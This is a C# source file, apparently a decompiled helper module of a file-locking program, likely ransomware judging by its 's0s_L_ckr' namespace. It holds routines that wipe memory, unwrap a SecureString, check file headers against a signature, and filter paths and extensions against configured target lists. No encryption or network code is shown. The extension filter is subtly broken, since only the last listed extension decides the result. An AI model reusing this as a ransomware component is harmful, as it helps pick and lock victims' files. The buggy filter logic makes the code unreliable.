using System;
using System.Globalization;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;

namespace s0s_L_ckr;

public sealed class Comn
{
	public static readonly Random rand = new Random();

	private Comn()
	{
	}

	[MethodImpl(MethodImplOptions.AggressiveInlining)]
	public static void ClearArray(ref byte[] array)
	{
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = (byte)rand.Next(0, 255);
		}
	}

	[MethodImpl(MethodImplOptions.AggressiveInlining)]
	public unsafe static void ClearString(ref string strg)
	{
		if (strg == null)
		{
			return;
		}
		int length = strg.Length;
		fixed (char* ptr = strg)
		{
			for (int i = 0; i < length; i++)
			{
				ptr[i] = (char)rand.Next(0, 255);
			}
		}
	}

	[MethodImpl(MethodImplOptions.AggressiveInlining)]
	public static void OpenSecStr(ref string dest, ref SecureString srce)
	{
		IntPtr intPtr = IntPtr.Zero;
		try
		{
			intPtr = Marshal.SecureStringToGlobalAllocUnicode(srce);
			dest = Marshal.PtrToStringUni(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeGlobalAllocUnicode(intPtr);
		}
	}

	public static bool CheckSig(FileInfo file)
	{
		bool result = true;
		using FileStream fileStream = File.OpenRead(file.FullName);
		byte[] array = new byte[ConfigMgr.FILE_SIGN_SIZE];
		fileStream.Read(array, 0, array.Length);
		for (int i = 0; i < ConfigMgr.FILE_SIGN_SIZE; i++)
		{
			if (array[i] != ConfigMgr.FILE_SIGN[i])
			{
				return false;
			}
		}
		return result;
	}

	public static bool DireInFil(string fullNam)
	{
		if (ConfigMgr.TRGT_PTH_FLR == null)
		{
			return true;
		}
		string text = fullNam.ToUpper(CultureInfo.CurrentCulture);
		string[] tRGT_PTH_FLR = ConfigMgr.TRGT_PTH_FLR;
		int num = 0;
		while (true)
		{
			if (num < tRGT_PTH_FLR.Length)
			{
				string value = tRGT_PTH_FLR[num];
				if (text.Contains(value))
				{
					break;
				}
				num++;
				continue;
			}
			return false;
		}
		return true;
	}

	public static bool FileInFil(string fileExt)
	{
		bool result = true;
		string text = fileExt.ToUpper(CultureInfo.CurrentCulture);
		string[] tRGT_FILS = ConfigMgr.TRGT_FILS;
		foreach (string text2 in tRGT_FILS)
		{
			result = ((text == text2) ? true : false);
		}
		return result;
	}
}
